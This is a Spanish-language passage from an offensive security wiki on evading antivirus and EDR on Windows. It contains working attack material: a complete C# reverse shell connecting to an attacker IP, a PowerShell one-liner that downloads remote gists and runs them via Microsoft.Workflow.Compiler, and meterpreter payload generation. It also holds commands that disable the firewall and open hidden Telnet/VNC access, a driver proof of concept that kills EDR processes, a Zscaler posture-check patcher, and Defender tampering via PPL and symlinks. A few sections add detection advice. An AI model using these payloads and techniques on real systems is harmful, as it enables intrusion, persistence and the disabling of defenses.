<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) es una herramienta que empaqueta payloads en contenedores de salida para evadir Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aquí hay una demo para bypassing SmartScreen empaquetando payloads dentro de archivos ISO usando [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) es un potente mecanismo de logging en Windows que permite a las aplicaciones y componentes del sistema **registrar eventos**. Sin embargo, también puede ser usado por productos de seguridad para monitorizar y detectar actividades maliciosas.

De forma similar a cómo AMSI se deshabilita (bypassed), también es posible hacer que la función **`EtwEventWrite`** del proceso de user space retorne inmediatamente sin registrar ningún evento. Esto se hace parcheando la función en memoria para que retorne de inmediato, deshabilitando efectivamente el logging de ETW para ese proceso.

Puedes encontrar más información en **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) y [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Cargar binarios C# en memoria se conoce desde hace bastante tiempo y sigue siendo una muy buena forma de ejecutar tus herramientas de post-exploitation sin ser detectado por AV.

Como el payload se cargará directamente en memoria sin tocar disco, solo tendremos que preocuparnos de parchear AMSI para todo el proceso.

La mayoría de los frameworks C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) ya proporcionan la capacidad de ejecutar C# assemblies directamente en memoria, pero hay diferentes formas de hacerlo:

- **Fork\&Run**

Implica **crear un nuevo proceso sacrificial**, inyectar tu código malicioso de post-exploitation en ese nuevo proceso, ejecutar tu código malicioso y, cuando termine, matar el nuevo proceso. Esto tiene tanto sus ventajas como sus desventajas. La ventaja del método fork and run es que la ejecución ocurre **fuera** de nuestro Beacon implant process. Esto significa que, si algo en nuestra acción de post-exploitation sale mal o es detectado, hay una **mucho mayor probabilidad** de que nuestro **implant sobreviva.** La desventaja es que hay una **mucho mayor probabilidad** de ser detectado por **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Se trata de inyectar el código malicioso de post-exploitation **dentro de su propio proceso**. De esta forma, puedes evitar tener que crear un nuevo proceso y que AV lo escanee, pero la desventaja es que, si algo sale mal con la ejecución de tu payload, hay una **mucho mayor probabilidad** de **perder tu beacon** porque podría crash.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Si quieres leer más sobre C# Assembly loading, consulta este artículo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) y su InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

También puedes cargar C# Assemblies **desde PowerShell**, revisa [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) y [el video de S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

Como se propone en [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), es posible ejecutar código malicioso usando otros lenguajes dando a la máquina comprometida acceso **al entorno del intérprete instalado en el SMB share controlado por el Attacker**.

Al permitir acceso a los Interpreter Binaries y al entorno en el SMB share, puedes **ejecutar código arbitrario en estos lenguajes dentro de la memoria** de la máquina comprometida.

El repo indica: Defender todavía analiza los scripts, pero al utilizar Go, Java, PHP etc tenemos **más flexibilidad para bypass static signatures**. Las pruebas con scripts de reverse shell aleatorios sin ofuscación en estos lenguajes han dado éxito.

## TokenStomping

Token stomping es una técnica que permite a un atacante **manipular el access token o un producto de seguridad como un EDR o AV**, permitiéndole reducir sus privilegios para que el proceso no muera pero no tenga permisos para comprobar actividades maliciosas.

Para evitarlo, Windows podría **impedir que procesos externos** obtengan handles sobre los tokens de procesos de seguridad.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

Como se describe en [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), es fácil desplegar Chrome Remote Desktop en el PC de una víctima y luego usarlo para takeover y mantener persistence:
1. Descarga desde https://remotedesktop.google.com/, haz clic en "Set up via SSH" y luego haz clic en el archivo MSI para Windows para descargar el archivo MSI.
2. Ejecuta el instalador en silencio en la víctima (admin required): `msiexec /i chromeremotedesktophost.msi /qn`
3. Vuelve a la página de Chrome Remote Desktop y haz clic en next. El asistente entonces te pedirá autorizar; haz clic en el botón Authorize para continuar.
4. Ejecuta el parámetro dado con algunos ajustes: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Note the pin param which allows to set the pin withuot using the GUI).


## Advanced Evasion

Evasion es un tema muy complicado; a veces tienes que tener en cuenta muchas fuentes distintas de telemetry en un solo sistema, así que es prácticamente imposible permanecer completamente undetected en entornos maduros.

Cada entorno contra el que vayas tendrá sus propias fortalezas y debilidades.

Te animo mucho a que veas esta charla de [@ATTL4S](https://twitter.com/DaniLJ94), para obtener un punto de apoyo en técnicas de Advanced Evasion más avanzadas.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Esta es también otra gran charla de [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Puedes usar [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck), que **eliminará partes del binary** hasta que **descubra qué parte Defender** está marcando como maliciosa y te la dividirá.\
Otra herramienta que hace **lo mismo es** [**avred**](https://github.com/dobin/avred), con una oferta web abierta que presta el servicio en [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Hasta Windows10, todos los Windows venían con un **Telnet server** que podías instalar (como administrator) haciendo:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Haz que se **inicie** cuando el sistema arranque y **ejecútalo** ahora:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Cambiar el puerto telnet** (stealth) y deshabilitar el firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Descárgalo desde: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (quieres las descargas bin, no el setup)

**EN EL HOST**: Ejecuta _**winvnc.exe**_ y configura el server:

- Activa la opción _Disable TrayIcon_
- Establece una password en _VNC Password_
- Establece una password en _View-Only Password_

Luego, mueve el binary _**winvnc.exe**_ y el archivo _**UltraVNC.ini**_ **recién** creado dentro de la **víctima**

#### **Reverse connection**

El **atacante** debe **ejecutar dentro de** su **host** el binary `vncviewer.exe -listen 5900` para que esté **preparado** para capturar una reverse **VNC connection**. Luego, dentro de la **víctima**: inicia el daemon winvnc `winvnc.exe -run` y ejecuta `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** Para mantener stealth no debes hacer algunas cosas

- No inicies `winvnc` si ya se está ejecutando o dispararás un [popup](https://i.imgur.com/1SROTTl.png). comprueba si está ejecutándose con `tasklist | findstr winvnc`
- No inicies `winvnc` sin `UltraVNC.ini` en el mismo directorio o hará que se abra [la ventana de configuración](https://i.imgur.com/rfMQWcf.png)
- No ejecutes `winvnc -h` para ayuda o dispararás un [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Descárgalo desde: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro de GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Ahora **inicia el lister** con `msfconsole -r file.rc` y **ejecuta** el **xml payload** con:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**El defensor actual terminará el proceso muy rápido.**

### Compilando nuestro propio reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primer C# Revershell

Compílalo con:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Úsalo con:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# usando compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Descarga y ejecución automática:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Lista de ofuscadores C#: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Usando python para ejemplos de build injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Other tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 aprovechó una pequeña utilidad de consola conocida como **Antivirus Terminator** para deshabilitar las protecciones del endpoint antes de desplegar ransomware. La herramienta trae su **propio driver vulnerable pero *signed*** y lo abusa para emitir operaciones privilegiadas en el kernel que incluso los servicios de AV Protected-Process-Light (PPL) no pueden bloquear.

Key take-aways
1. **Signed driver**: El archivo entregado en disco es `ServiceMouse.sys`, pero el binario es el driver legítimamente signed `AToolsKrnl64.sys` de “System In-Depth Analysis Toolkit” de Antiy Labs. Como el driver lleva una firma válida de Microsoft, se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
La primera línea registra el driver como un **kernel service** y la segunda lo inicia para que `\\.\ServiceMouse` sea accesible desde user land.
3. **IOCTLs exposed by the driver**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Terminate an arbitrary process by PID (used to kill Defender/EDR services) |
| `0x990000D0` | Delete an arbitrary file on disk |
| `0x990001D0` | Unload the driver and remove the service |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD omite por completo las protecciones de user-mode; el código que se ejecuta en el kernel puede abrir procesos *protected*, terminarlos o manipular objetos del kernel independientemente de PPL/PP, ELAM u otras funciones de hardening.

Detection / Mitigation
•  Habilita la block list de drivers vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows rechace cargar `AToolsKrnl64.sys`.
•  Monitorea la creación de nuevos servicios de *kernel* y alerta cuando se cargue un driver desde un directorio world-writable o que no esté presente en la allow-list.
•  Vigila handles en user-mode hacia objetos de dispositivo personalizados seguidos de llamadas `DeviceIoControl` sospechosas.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** aplica reglas de device-posture localmente y depende de Windows RPC para comunicar los resultados a otros componentes. Dos decisiones de diseño débiles hacen posible un bypass completo:

1. La evaluación de posture ocurre **por completo del lado del cliente** (se envía un boolean al servidor).
2. Los endpoints RPC internos solo validan que el ejecutable que se conecta esté **signed by Zscaler** (mediante `WinVerifyTrust`).

Mediante **patching de cuatro binarios signed en disco** ambos mecanismos pueden neutralizarse:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Always returns `1` so every check is compliant |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ any (even unsigned) process can bind to the RPC pipes |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Short-circuited |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Después de reemplazar los archivos originales y reiniciar el stack del servicio:

* **Todas** las comprobaciones de postura muestran **verde/compliant**.
* Los binarios sin firma o modificados pueden abrir los endpoints RPC de named-pipe (p. ej. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso sin restricciones a la red interna definida por las políticas de Zscaler.

Este caso de estudio demuestra cómo decisiones de confianza puramente del lado del cliente y comprobaciones simples de firma pueden ser derrotadas con unos pocos parches de bytes.

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) aplica una jerarquía de signer/level para que solo procesos protegidos de igual o mayor nivel puedan modificar a otros. Ofensivamente, si puedes lanzar legítimamente un binario con PPL habilitado y controlar sus argumentos, puedes convertir una funcionalidad benigna (p. ej., logging) en un write primitive restringido, respaldado por PPL, contra directorios protegidos usados por AV/EDR.

Lo que hace que un proceso se ejecute como PPL
- El EXE objetivo (y cualquier DLL cargada) debe estar firmado con un EKU compatible con PPL.
- El proceso debe crearse con CreateProcess usando las flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Se debe solicitar un protection level compatible que coincida con el signer del binario (p. ej., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para signers anti-malware, `PROTECTION_LEVEL_WINDOWS` para signers de Windows). Los niveles incorrectos fallarán en la creación.

Consulta también una introducción más amplia a PP/PPL y a la protección de LSASS aquí:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Herramientas de launcher
- Ayudante de código abierto: CreateProcessAsPPL (selecciona el protection level y reenvía argumentos al EXE objetivo):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Patrón de uso:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- El binario del sistema firmado `C:\Windows\System32\ClipUp.exe` se auto-inicia y acepta un parámetro para escribir un archivo de log en una ruta especificada por el llamador.
- Cuando se lanza como proceso PPL, la escritura del archivo ocurre con respaldo PPL.
- ClipUp no puede analizar rutas que contengan espacios; usa rutas cortas 8.3 para apuntar a ubicaciones normalmente protegidas.

8.3 short path helpers
- Listar nombres cortos: `dir /x` en cada directorio padre.
- Derivar la ruta corta en cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Lanza el LOLBIN capaz de PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` usando un launcher (por ejemplo, CreateProcessAsPPL).
2) Pasa el argumento de ruta de log de ClipUp para forzar la creación de un archivo en un directorio AV protegido (por ejemplo, Defender Platform). Usa nombres cortos 8.3 si es necesario.
3) Si el binario objetivo normalmente está abierto/bloqueado por el AV mientras se ejecuta (por ejemplo, MsMpEng.exe), programa la escritura en el arranque antes de que el AV se inicie instalando un servicio de autoarranque que se ejecute de forma fiable antes. Valida el orden de arranque con Process Monitor (boot logging).
4) Al reiniciar, la escritura respaldada por PPL ocurre antes de que el AV bloquee sus binarios, corrompe el archivo objetivo e impide el inicio.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notas y restricciones
- No puedes controlar el contenido que ClipUp escribe más allá de la ubicación; la primitiva es adecuada para corrupción más que para inyección precisa de contenido.
- Requiere local admin/SYSTEM para instalar/iniciar un servicio y una ventana de reinicio.
- El timing es crítico: el objetivo no debe estar abierto; la ejecución en tiempo de arranque evita bloqueos de archivos.

Detections
- Creación de proceso de `ClipUp.exe` con argumentos inusuales, especialmente con parent de launchers no estándar, alrededor del boot.
- Nuevos servicios configurados para auto-start binaries sospechosos y que arrancan consistentemente antes de Defender/AV. Investiga la creación/modificación de servicios antes de fallos de inicio de Defender.
- File integrity monitoring en binarios/Platform directories de Defender; creaciones/modificaciones inesperadas de archivos por procesos con protected-process flags.
- ETW/EDR telemetry: busca procesos creados con `CREATE_PROTECTED_PROCESS` y uso anómalo de PPL level por binaries no AV.

Mitigations
- WDAC/Code Integrity: restringe qué signed binaries pueden ejecutarse como PPL y bajo qué parents; bloquea la invocación de ClipUp fuera de contextos legítimos.
- Service hygiene: restringe la creación/modificación de servicios auto-start y monitoriza la manipulación del orden de inicio.
- Asegura que Defender tamper protection y las protecciones de early-launch estén habilitadas; investiga errores de arranque que indiquen corrupción de binarios.
- Considera deshabilitar la generación de 8.3 short-names en volúmenes que alojan tooling de seguridad si es compatible con tu entorno (prueba a fondo).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender elige la plataforma desde la que ejecuta enumerando subfolders bajo:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Selecciona el subfolder con la cadena de versión lexicográficamente más alta (por ejemplo, `4.18.25070.5-0`), y luego inicia desde allí los procesos del servicio de Defender (actualizando en consecuencia las rutas del servicio/registry). Esta selección confía en directory entries, incluyendo directory reparse points (symlinks). Un administrador puede aprovechar esto para redirigir Defender a una ruta writable por el atacante y lograr DLL sideloading o service disruption.

Preconditions
- Local Administrator (necesario para crear directories/symlinks bajo la carpeta Platform)
- Capacidad de reiniciar o forzar la re-selección de la plataforma de Defender (service restart on boot)
- Solo se requieren built-in tools (mklink)

Why it works
- Defender bloquea writes en sus propias carpetas, pero la selección de su plataforma confía en directory entries y elige la versión lexicográficamente más alta sin validar que el target resuelva a una ruta protegida/de confianza.

Step-by-step (example)
1) Prepara una copia writable de la carpeta de plataforma actual, por ejemplo `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un symlink de directorio de versión superior dentro de Platform apuntando a tu carpeta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selección de trigger (se recomienda reiniciar):
```cmd
shutdown /r /t 0
```
4) Verifica que MsMpEng.exe (WinDefend) se ejecute desde la ruta redirigida:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Debes observar la nueva ruta del proceso en `C:\TMP\AV\` y la configuración/registro del servicio reflejando esa ubicación.

Opciones de post-explotación
- DLL sideloading/code execution: Coloca/reemplaza DLLs que Defender carga desde su directorio de aplicación para ejecutar código en los procesos de Defender. Consulta la sección anterior: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Elimina el version-symlink para que en el siguiente inicio la ruta configurada no se resuelva y Defender no pueda iniciarse:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Ten en cuenta que esta técnica no proporciona escalada de privilegios por sí misma; requiere permisos de admin.

## API/IAT Hooking + Call-Stack Spoofing con PIC (estilo Crystal Kit)

Los red teams pueden sacar la evasión en runtime del implant de C2 y moverla al propio módulo objetivo haciendo hooking de su Import Address Table (IAT) y redirigiendo APIs seleccionadas a código independiente de posición (PIC) controlado por el atacante. Esto generaliza la evasión más allá de la pequeña superficie de API que exponen muchos kits (p. ej., CreateProcessA), y extiende las mismas protecciones a BOFs y DLLs de post-exploitation.

Enfoque general
- Coloca un blob PIC junto al módulo objetivo usando un reflective loader (preparado o companion). El PIC debe ser autosuficiente e independiente de la posición.
- Cuando la DLL anfitriona se cargue, recorre su IMAGE_IMPORT_DESCRIPTOR y parchea las entradas de la IAT para los imports objetivo (p. ej., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para que apunten a wrappers PIC ligeros.
- Cada wrapper PIC ejecuta evasiones antes de hacer tail-call a la dirección real de la API. Las evasiones típicas incluyen:
- Enmascarar/desenmascarar memoria alrededor de la llamada (p. ej., cifrar regiones del beacon, RWX→RX, cambiar nombres/permisos de páginas) y luego restaurar después de la llamada.
- Call-stack spoofing: construir una stack benigna y saltar a la API objetivo para que el análisis del call-stack resuelva marcos esperados.
- Por compatibilidad, exporta una interfaz para que un Aggressor script (o equivalente) pueda registrar qué APIs hookear para Beacon, BOFs y DLLs post-ex.

Por qué IAT hooking aquí
- Funciona para cualquier código que use el import hookeado, sin modificar el código de la herramienta ni depender de que Beacon proxyee APIs específicas.
- Cubre DLLs post-ex: hookear LoadLibrary* te permite interceptar cargas de módulos (p. ej., System.Management.Automation.dll, clr.dll) y aplicar la misma evasión de masking/stack a sus llamadas a APIs.
- Restaura el uso fiable de comandos post-ex de creación de procesos contra detecciones basadas en call-stack, envolviendo CreateProcessA/W.

Esquema mínimo de IAT hook (pseudocódigo x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplica el patch después de relocations/ASLR y antes del primer uso del import. Reflective loaders como TitanLdr/AceLdr demuestran hooking durante DllMain del módulo cargado.
- Mantén los wrappers pequeños y PIC-safe; resuelve la API real mediante el valor original de la IAT que capturaste antes de patching o mediante LdrGetProcedureAddress.
- Usa transiciones RW → RX para PIC y evita dejar páginas writable+executable.

Call‑stack spoofing stub
- Los PIC stubs estilo Draugr construyen una fake call chain (return addresses hacia módulos benignos) y luego pivotan hacia la API real.
- Esto derrota detections que esperan canonical stacks de Beacon/BOFs hacia APIs sensibles.
